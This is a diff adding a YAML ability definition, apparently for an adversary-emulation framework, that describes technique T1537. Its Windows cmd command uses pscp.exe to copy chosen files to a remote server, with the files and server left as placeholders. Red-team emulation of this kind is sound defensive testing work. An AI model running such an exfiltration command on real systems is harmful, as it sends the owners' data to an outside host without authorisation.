@@ -1,0 +1,31 @@
+ability_id: ea4bc858-ba13-4f97-9df3-c543d8f3d44c
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Exfil data to cloud account
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: '"#{pscp_local_path}\pscp.exe" "#{pscp_exfil_files}" "#{pscp_user}"@"#{pscp_server}":/"#{pscp_drop_location}"'
+  language: null
+  name: cmd
+  parsers: []
+  payloads:
+  - pscp.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Transfer Data to Cloud Account
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: exfiltration
+technique_id: T1537
+technique_name: Transfer Data to Cloud Account
